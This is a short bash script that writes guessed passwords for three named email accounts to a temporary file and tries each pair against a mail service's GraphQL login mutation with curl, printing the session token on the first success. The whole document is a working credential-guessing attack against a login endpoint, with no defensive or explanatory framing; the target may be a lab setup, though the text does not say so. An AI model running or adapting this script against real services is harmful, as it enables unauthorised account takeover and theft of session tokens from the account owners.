#!/usr/bin/env bash
set -euo pipefail

cat > /tmp/requestria_creds.txt <<'CREDS'
luna.starlight@equestriasociety.com:friendship
luna.starlight@equestriasociety.com:friendship123
luna.starlight@equestriasociety.com:Friendship123!
luna.starlight@equestriasociety.com:luna123
luna.starlight@equestriasociety.com:Luna123!
luna.starlight@equestriasociety.com:password
luna.starlight@equestriasociety.com:Password123!
luna.starlight@equestriasociety.com:loveandtolerance
luna.starlight@equestriasociety.com:magic
rose.garden@equestriasociety.com:friendship
rose.garden@equestriasociety.com:rose123
rose.garden@equestriasociety.com:Rose123!
rose.garden@equestriasociety.com:password
rose.garden@equestriasociety.com:Password123!
starswirl.helper@equestriasociety.com:friendship
starswirl.helper@equestriasociety.com:starswirl123
starswirl.helper@equestriasociety.com:Starswirl123!
starswirl.helper@equestriasociety.com:password
starswirl.helper@equestriasociety.com:Password123!
CREDS

query='mutation Login($email:String!,$password:String!){login(email:$email,password:$password){token user{id email name role}}}'

while IFS=: read -r email password; do
  payload=$(jq -nc --arg email "$email" --arg password "$password" --arg query "$query" \
    '{query:$query,variables:{email:$email,password:$password}}')
  out=$(curl -sS -X POST https://mail.equestriasociety.com/graphql \
    -H 'Content-Type: application/json' \
    --data "$payload")
  if ! printf '%s' "$out" | rg -q '"errors"'; then
    printf 'SUCCESS %s:%s\n%s\n' "$email" "$password" "$out"
    exit 0
  fi
  printf 'FAIL %s:%s\n' "$email" "$password"
done </tmp/requestria_creds.txt

printf 'NO_HITS\n'
